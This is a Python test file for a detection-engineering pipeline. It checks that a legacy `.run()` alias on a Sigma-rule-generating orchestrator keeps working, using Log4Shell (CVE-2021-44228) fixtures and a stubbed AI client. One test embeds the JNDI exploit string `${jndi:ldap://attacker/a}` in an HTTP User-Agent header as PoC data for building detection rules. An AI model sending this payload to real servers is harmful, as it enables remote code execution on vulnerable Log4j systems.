"""Legacy `.run(core=..., analysis=..., attack=..., telemetry=..., references=...)`
signature contract.

The CLI controller (`triage_controller.py:180`) and the integration test
(`test_step1_step2_step4_step6_e2e.py:257`) both call this 5-keyword form.
This test ensures `Step6Orchestrator.run(...)` continues to work after the
architect refactor (it's now an alias of `SigmaRuleAI.plan(...)`).
"""
from __future__ import annotations

import json

import pytest

from src.usecases.step_6_generate_sigma.orchestrator import (
    SigmaRuleAI,
    Step6Orchestrator,
)

from tests.usecases.step_6_generate_sigma.conftest import run_async


def test_step6_orchestrator_is_alias_of_sigma_rule_ai():
    """Architect v9: `Step6Orchestrator = SigmaRuleAI` — same class, same behavior."""
    assert Step6Orchestrator is SigmaRuleAI


async def _run_signature_accepts_core_analysis_attack_telemetry_references(
    log4shell_telemetry_plan, log4shell_core, stub_client
):
    """All five legacy kwargs are accepted; `run` is the back-compat alias for `plan`."""
    stub_client.next_response = json.dumps({
        "detections": [],
        "correlations": [],
        "reasoning": "test reasoning",
    })

    orch = Step6Orchestrator(ai_client=stub_client)
    result = await orch.run(
        core=log4shell_core,
        analysis=None,
        attack=None,
        telemetry=log4shell_telemetry_plan,
        references=["https://extra-ref.example.com"],
    )

    assert result.cve_id == "CVE-2021-44228"
    assert result.detections == []


async def _run_requires_telemetry(log4shell_core, stub_client):
    """Legacy `.run()` without telemetry raises a clear error (not silent None-pass)."""
    orch = Step6Orchestrator(ai_client=stub_client)
    with pytest.raises(Exception, match="telemetry is required"):
        await orch.run(
            core=log4shell_core,
            analysis=None,
            attack=None,
            telemetry=None,
            references=None,
        )


async def _run_poc_payload_reaches_context(log4shell_telemetry_plan, log4shell_core, stub_client):
    """PoC payload (poc_description + poc_network_payloads) reaches the user prompt context."""
    from src.domain.models.telemetry_discovery import PoCSummary

    stub_client.next_response = json.dumps({
        "detections": [],
        "correlations": [],
        "reasoning": "ok",
    })

    poc = PoCSummary(
        poc_description="Send ${jndi:ldap://attacker/a} payload in HTTP User-Agent header.",
        poc_network_payloads=[
            {
                "method": "GET",
                "path": "/",
                "headers": {"User-Agent": "${jndi:ldap://attacker/a}"},
            }
        ],
    )

    orch = Step6Orchestrator(ai_client=stub_client)
    await orch.run(
        core=log4shell_core,
        analysis=None,
        attack=None,
        telemetry=log4shell_telemetry_plan,
        poc=poc,
    )

    # The stub captures the rendered user prompt in `calls[0].kwargs["user_prompt"]`.
    assert stub_client.calls, "expected call_llm to have been invoked"
    user_prompt = stub_client.calls[0]["kwargs"]["user_prompt"]
    # PoC description text must appear in the rendered user prompt (Step 6
    # derives Sigma `selection[].value` from real PoC documentation).
    assert "Send ${jndi:ldap://attacker/a} payload" in user_prompt
    # Network payload dict must appear (jndi URI carried in headers).
    assert "User-Agent" in user_prompt
    assert "${jndi:ldap://attacker/a}" in user_prompt


def test_run_signature_accepts_core_analysis_attack_telemetry_references(
    log4shell_telemetry_plan, log4shell_core, stub_client
):
    run_async(_run_signature_accepts_core_analysis_attack_telemetry_references(
        log4shell_telemetry_plan, log4shell_core, stub_client
    ))


def test_run_requires_telemetry(log4shell_core, stub_client):
    run_async(_run_requires_telemetry(log4shell_core, stub_client))


def test_run_poc_payload_reaches_context(log4shell_telemetry_plan, log4shell_core, stub_client):
    run_async(_run_poc_payload_reaches_context(
        log4shell_telemetry_plan, log4shell_core, stub_client
    ))
